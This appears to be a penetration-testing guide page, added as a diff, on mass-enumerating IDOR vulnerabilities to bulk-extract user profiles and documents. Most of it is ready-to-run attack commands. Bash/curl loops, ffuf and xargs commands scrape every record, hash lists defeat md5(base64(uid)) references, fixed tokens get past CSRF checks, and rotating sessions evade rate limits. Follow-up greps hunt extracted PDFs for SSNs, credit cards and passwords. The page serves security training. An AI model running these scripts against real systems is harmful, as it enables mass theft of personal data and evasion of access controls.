@@ -1,0 +1,450 @@
+---
+title: Mass Enumeration
+description: Once a single IDOR substitution works, scale up - Burp Intruder pitchfork mode, ffuf with custom payloads, bash loops with curl, and the special case of mass-extracting resources behind reversed hash/encoding schemes (md5(base64(uid)) and similar).
+mitre: [T1190, T1213]
+d3fend: [D3-IAA]
+impact: [DataExfil]
+owasp: [A01]
+sidebar:
+  order: 3
+  label: Mass Enumeration
+---
+
+## TL;DR
+
+After confirming one substitution works, the next step is "what else can I read." Three tooling tiers for bulk extraction:
+
+```
+# Tier 1 - bash loops (most flexible; fine for ≤1000 iterations)
+for uid in $(seq 1 1000); do
+    curl -sb 'PHPSESSID=mine' "http://target/api/profile/$uid" >> all.json
+done
+
+# Tier 2 - ffuf for fuzzing + concurrency
+ffuf -w <(seq 1 10000) -u 'http://target/api/profile/FUZZ' \
+     -H 'Cookie: PHPSESSID=mine' -mc 200 -mr '"uid"'
+
+# Tier 3 - Burp Intruder for inspection alongside extraction
+#   Send to Intruder → set position → payload type Numbers → Start
+```
+
+For hashed/encoded references, compute every hash up-front:
+
+```
+for uid in $(seq 1 1000); do
+    echo -n "$uid" | base64 -w 0 | md5sum | awk '{print $1}'
+done > hashes.txt
+
+ffuf -w hashes.txt -u 'http://target/download.php' \
+     -X POST -d 'contract=FUZZ' -H 'Cookie: ...' \
+     -mc 200 -mr 'PDF'
+```
+
+Success indicator: a directory full of resources or a flat file of API responses representing every user / record / asset on the system.
+
+## Choosing the right tool
+
+| Tool | When to use it | Strength | Weakness |
+| --- | --- | --- | --- |
+| **bash + curl** | Small ranges (≤1000), need to control every request, want to preprocess input or save filenames specially | Maximum flexibility, no setup | Sequential; slow for large ranges; you build error handling yourself |
+| **ffuf** | Medium-to-large ranges (1000+), want concurrency, want filter-by-status/length/content | Fast, well-known, terse syntax | Less flexible output handling than a script |
+| **Burp Intruder** | When you want to see each request/response, iterate manually, or chain Intruder output into other Burp tools | Visual; integrates with the rest of Burp; great for low-volume exploration | Slow at high volume; rate-limited in Community Edition |
+| **wfuzz** | Similar niche to ffuf | Mature, lots of features | Slower than ffuf in practice |
+| **Python `requests`** | When you need parsing/transformation per request (extract a value, follow a link, etc.) | Maximum programmability | More code than bash for simple cases |
+
+Most engagements use a mix - Burp Intruder for the first few hits to confirm the pattern, then a bash or ffuf loop for the bulk pull.
+
+## Bash + curl recipes
+
+### Sequential ID enumeration
+
+```bash
+#!/bin/bash
+# Loop, output to a single file
+URL='http://target/api/profile'
+COOKIE='PHPSESSID=mine'
+
+for uid in $(seq 1 1000); do
+    response=$(curl -sb "$COOKIE" "$URL/$uid")
+    # Skip empty/error responses
+    if echo "$response" | grep -q '"uid"'; then
+        echo "$response" >> all-profiles.json
+        echo "$response" >> all-profiles.txt
+    fi
+done
+```
+
+Add basic rate limiting if the server pushes back:
+
+```bash
+for uid in $(seq 1 1000); do
+    curl -sb "$COOKIE" "$URL/$uid" >> all.json
+    sleep 0.1                       # 100ms between requests
+    [ $((uid % 100)) -eq 0 ] && echo "Progress: $uid"
+done
+```
+
+### Document scraping (links followed by downloads)
+
+When the IDOR exposes a list of resource URLs that you then download:
+
+```bash
+#!/bin/bash
+URL='http://target'
+COOKIE='PHPSESSID=mine'
+
+mkdir -p docs
+
+for uid in $(seq 1 100); do
+    # Pull document list for this uid
+    links=$(curl -sb "$COOKIE" "$URL/documents.php?uid=$uid" \
+            | grep -oP '/documents/\S+\.pdf')
+
+    for link in $links; do
+        # Skip if already downloaded
+        filename=$(basename "$link")
+        [ -f "docs/$filename" ] && continue
+
+        # Download
+        curl -sb "$COOKIE" "$URL$link" -o "docs/$filename"
+        echo "[+] $filename"
+    done
+done
+
+echo "Total: $(ls docs | wc -l) documents"
+```
+
+The `[ -f ... ] && continue` skip is important - once you've fetched a document, don't refetch on subsequent iterations (avoids wasted requests if multiple users link to the same file).
+
+### Parallel curl with xargs
+
+For faster pulls without going to ffuf:
+
+```bash
+seq 1 1000 | xargs -P 10 -I{} bash -c '
+    curl -sb "PHPSESSID=mine" "http://target/api/profile/{}" \
+         >> all-profiles-{}.json 2>/dev/null
+'
+# -P 10 = 10 concurrent processes
+```
+
+Output goes to one file per request to avoid append-collisions; reassemble after:
+
+```bash
+cat all-profiles-*.json > all-profiles.json
+rm all-profiles-*.json
+```
+
+## ffuf recipes
+
+ffuf is fast (10-100x bash) and has good filter primitives built in.
+
+### Basic ID enumeration
+
+```shell
+$ ffuf -w <(seq 1 10000) \
+       -u 'http://target/api/profile/FUZZ' \
+       -H 'Cookie: PHPSESSID=mine' \
+       -mc 200 \
+       -mr '"uid"' \
+       -o profiles.json -of json
+```
+
+Flags:
+- `-w <(seq 1 10000)` - process-substitution payload list; no temp file needed
+- `FUZZ` - substitution placeholder
+- `-mc 200` - only show 200 responses
+- `-mr '"uid"'` - match-regex; only keep responses containing `"uid"` (filters out boilerplate)
+- `-o profiles.json -of json` - save matched requests to a JSON file
+
+ffuf's JSON output records each matched request's status, length, words, and response body for later processing.
+
+### Body-position fuzzing for POST IDOR
+
+```shell
+$ ffuf -w <(seq 1 1000) \
+       -X POST \
+       -d 'uid=FUZZ' \
+       -H 'Cookie: PHPSESSID=mine' \
+       -H 'Content-Type: application/x-www-form-urlencoded' \
+       -u 'http://target/api/get-user' \
+       -mc 200 -fs 234           # filter-size: skip the default "not found" page
+```
+
+`-fs N` filters *out* responses of exactly N bytes - useful when the not-found response has a constant size and you want to skip it.
+
+### Two-variable enumeration
+
+When you need to combine two parameters (uid × month, for example):
+
+```shell
+$ ffuf -w uids.txt:UID -w months.txt:MONTH \
+       -u 'http://target/files/Report_UID_MONTH.pdf' \
+       -mode pitchfork
+```
+
+`pitchfork` mode pairs the lists (line 1 of uids.txt with line 1 of months.txt, etc.). `clusterbomb` mode is the cartesian product (every uid × every month) - explodes fast, use sparingly.
+
+### Rate limiting
+
+```shell
+-rate 10                  # 10 requests/second total
+-p 0.2                    # 0.2 seconds delay between requests (per thread)
+-t 5                      # 5 concurrent threads
+```
+
+When the target rate-limits, observe the response. Sometimes IDOR endpoints rate-limit at the *session* level - switching to a different test account's session reset the budget.
+
+## Burp Intruder recipes
+
+For low-volume exploration where you want to *see* each response:
+
+1. Send the IDOR request to Intruder
+2. Click "Clear §" (clear default positions)
+3. Highlight the reference value, click "Add §"
+4. Payloads tab → Payload type: Numbers; from 1 to 1000; step 1
+5. Options tab → Grep-Match: add strings that indicate success (`"uid"`, the victim's name, etc.)
+6. Start attack
+
+In Community Edition, Intruder is throttled - for >1000 iterations, switch to ffuf. For ≤500, Intruder is fine and the sortable response table makes it easy to spot interesting variations (e.g., a `role: "admin"` response among 99 `role: "employee"` ones).
+
+### Sniper, Battering Ram, Pitchfork, Cluster Bomb
+
+| Mode | Use case |
+| --- | --- |
+| **Sniper** | One position, one payload list - the standard IDOR substitution |
+| **Battering Ram** | One payload list, applied to *multiple* positions simultaneously - both `uid=N` in URL and `uid=N` in body get the same value |
+| **Pitchfork** | Multiple positions, multiple lists, paired (1st of list A with 1st of list B) |
+| **Cluster Bomb** | Multiple positions, multiple lists, cartesian product - every combination |
+
+For IDOR specifically, Sniper handles 90% of cases. Pitchfork comes up when the request has both a uid (in path) and a matching uuid (in body) and you've enumerated both via a prior IDOR - pitchfork lets you submit them as paired tuples.
+
+## The hashed-reference case
+
+When the reference isn't a sequential integer but a hash/encoding of one, the mass-enumeration pre-step is computing every hash:
+
+### Build the hash list
+
+For the canonical `md5(base64(uid))` case (HTB-style):
+
+```bash
+# Generate first 1000 hashed references
+for uid in $(seq 1 1000); do
+    echo -n "$uid" | base64 -w 0 | md5sum | awk '{print $1}'
+done > hashes.txt
+
+head -5 hashes.txt
+# cdd96d3cc73d1dbdaffa03cc6cd7339b   uid=1
+# 0b7e7dee87b1c3b98e72131173dfbbbf   uid=2
+# 0b24df25fe628797b3a50ae0724d2730   uid=3
+# f7947d50da7a043693a592b4db43b0a1   uid=4
+# 8b9af1f7f76daf0f02bd9c48c4a2e3d0   uid=5
+```
+
+For `md5(uid)` directly:
+
+```bash
+for uid in $(seq 1 1000); do
+    echo -n "$uid" | md5sum | awk '{print $1}'
+done > hashes.txt
+```
+
+For `sha256(username)` where you also have a list of usernames:
+
+```bash
+while read username; do
+    echo -n "$username" | sha256sum | awk '{print $1}'
+done < usernames.txt > hashes.txt
+```
+
+### Drive the fuzzer with the hash list
+
+```shell
+# ffuf
+$ ffuf -w hashes.txt \
+       -X POST \
+       -d 'contract=FUZZ' \
+       -H 'Cookie: PHPSESSID=mine' \
+       -u 'http://target/download.php' \
+       -mc 200 \
+       -mr '%PDF'
+
+# Or bash
+for hash in $(cat hashes.txt); do
+    curl -sOJ -X POST \
+         -b 'PHPSESSID=mine' \
+         -d "contract=$hash" \
+         "http://target/download.php"
+done
+```
+
+The `-O -J` flags tell curl to use the server's `Content-Disposition` filename - useful when the response sets filenames like `contract_<hash>.pdf`.
+
+### Preserving the uid → file mapping
+
+Often you want to know which file came from which uid. Loop with explicit labeling:
+
+```bash
+for uid in $(seq 1 1000); do
+    hash=$(echo -n "$uid" | base64 -w 0 | md5sum | awk '{print $1}')
+    curl -sb 'PHPSESSID=mine' \
+         -X POST -d "contract=$hash" \
+         "http://target/download.php" \
+         -o "contract_uid${uid}_hash${hash}.pdf"
+done
+```
+
+Filename embeds both the human-readable uid and the computed hash. Saves a post-processing step where you'd otherwise have to reverse the hash table.
+
+## Handling edge cases
+
+### Non-existent IDs returning 200
+
+Some apps return HTTP 200 with an empty result body for nonexistent IDs rather than 404. Filter by response *content*, not status:
+
+```shell
+# Bad - accepts everything
+ffuf ... -mc 200
+
+# Good - only response bodies actually containing data
+ffuf ... -mc 200 -mr '"email"'
+
+# Or filter by size when the "not found" response is a constant length
+ffuf ... -mc 200 -fs 234
+```
+
+For bash:
+
+```bash
+for uid in $(seq 1 1000); do
+    response=$(curl -sb 'PHPSESSID=mine' "http://target/api/profile/$uid")
+    if echo "$response" | jq -e .email > /dev/null 2>&1; then
+        echo "$response" >> hits.json
+    fi
+done
+```
+
+### CSRF tokens and per-request state
+
+When the endpoint requires a CSRF token that rotates per request, the simple loop breaks. Two paths:
+
+1. **Test if the token check is strict.** Many apps generate a CSRF token but only verify "is it non-empty" or "did it come from this session." A single fixed token usually works for the duration of the session.
+
+   ```bash
+   TOKEN=$(curl -sb 'PHPSESSID=mine' http://target/page \
+           | grep -oP 'name="csrf" value="\K[^"]+')
+   for uid in $(seq 1 100); do
+       curl -X POST -d "uid=$uid&csrf=$TOKEN" \
+            -b 'PHPSESSID=mine' \
+            "http://target/api/get-user"
+   done
+   ```
+
+2. **Refresh the token each iteration.** Slower but works against per-request tokens.
+
+   ```bash
+   for uid in $(seq 1 100); do
+       TOKEN=$(curl -sb 'PHPSESSID=mine' http://target/page \
+               | grep -oP 'name="csrf" value="\K[^"]+')
+       curl -X POST -d "uid=$uid&csrf=$TOKEN" \
+            -b 'PHPSESSID=mine' \
+            "http://target/api/get-user"
+   done
+   ```
+
+See also [CSRF token bypass](/codex/web/sessions/csrf-token-bypass/) for the bypass categories that may eliminate the need for refresh.
+
+### Rate limiting
+
+When the server starts returning 429 or slow responses partway through:
+
+```bash
+for uid in $(seq 1 1000); do
+    while true; do
+        response=$(curl -sb 'PHPSESSID=mine' \
+                   -o /tmp/r.json -w '%{http_code}' \
+                   "http://target/api/profile/$uid")
+        if [ "$response" = "429" ]; then
+            sleep 60       # back off a minute
+            continue
+        fi
+        break
+    done
+    cat /tmp/r.json >> all.json
+done
+```
+
+Or rotate sessions:
+
+```bash
+SESSIONS=('session1' 'session2' 'session3')
+for uid in $(seq 1 1000); do
+    session="${SESSIONS[$((uid % 3))]}"
+    curl -sb "PHPSESSID=$session" "http://target/api/profile/$uid"
+done
+```
+
+### UUIDs and other non-enumerable references
+
+When the reference is genuinely random (UUIDv4 server-generated, not derived from anything), brute-forcing it is infeasible (2¹²² values). The path is:
+
+- Leak the UUIDs first via a *separate* disclosure IDOR (`GET /api/users` returning a list of `{uid, uuid}` pairs)
+- Use the leaked UUIDs as input to the mass-enumeration loop
+- See [Chaining](/codex/web/idor/chaining/) for the combined-IDOR pattern
+
+Mass enumeration *itself* requires predictable references. If predictability fails, the chain question becomes "where do I get the unpredictable values from?"
+
+## Output processing
+
+After a large pull, basic post-processing patterns:
+
+```bash
+# Count distinct users
+jq -r '.uid' all.json | sort -u | wc -l
+
+# Pull all email addresses
+jq -r '.email' all.json > emails.txt
+
+# Find admin-role accounts
+jq 'select(.role == "admin" or .role == "web_admin")' all.json
+
+# Diff two pulls (snapshot for change detection across an engagement)
+jq -S '.' pull-day1.json > pull-day1.sorted.json
+jq -S '.' pull-day2.json > pull-day2.sorted.json
+diff pull-day1.sorted.json pull-day2.sorted.json
+```
+
+For PDF documents, common follow-ups:
+
+```bash
+# Extract text from every PDF
+for f in docs/*.pdf; do
+    pdftotext "$f" "${f%.pdf}.txt"
+done
+
+# Grep across the text corpus for sensitive strings
+grep -lE 'SSN|social|credit card|password' docs/*.txt
+```
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| Sequential bash loop | `for i in $(seq 1 N); do curl ...; done` |
+| Parallel bash loop | `seq 1 N \| xargs -P 10 -I{} curl ...` |
+| ffuf with numeric range | `ffuf -w <(seq 1 N) -u 'http://target/FUZZ'` |
+| ffuf filter by content | `-mr 'pattern'` (match-regex) |
+| ffuf filter by size | `-fs N` (filter-size: exclude size N) |
+| ffuf save matched | `-o file.json -of json` |
+| Build md5(uid) list | `for i in $(seq 1 N); do echo -n $i \| md5sum \| awk '{print $1}'; done` |
+| Build md5(base64(uid)) list | `... \| base64 -w 0 \| md5sum \| awk '{print $1}'` |
+| Save with original filename | `curl -OJ` (uses Content-Disposition) |
+| Rate-limit via delay | `sleep 0.1` between curl calls, or ffuf `-p 0.1` |
+| Rate-limit via concurrency | xargs `-P` or ffuf `-t` |
+| Burp Intruder mode for IDOR | Sniper (single position) |
+| Extract values from JSON pull | `jq -r '.field' all.json` |
+| Find admin among bulk pull | `jq 'select(.role \| test("admin"))' all.json` |
+| Refresh CSRF token per request | Fetch page, regex token, use in request |
+| Skip already-downloaded files | `[ -f "$file" ] && continue` |
+
+For the API-mutation patterns (PUT/POST/DELETE that need both disclosure and modification), continue to [Insecure APIs](/codex/web/idor/insecure-apis/). For the end-to-end skill-assessment chain combining disclosure + role escalation + function call, see [Chaining](/codex/web/idor/chaining/).
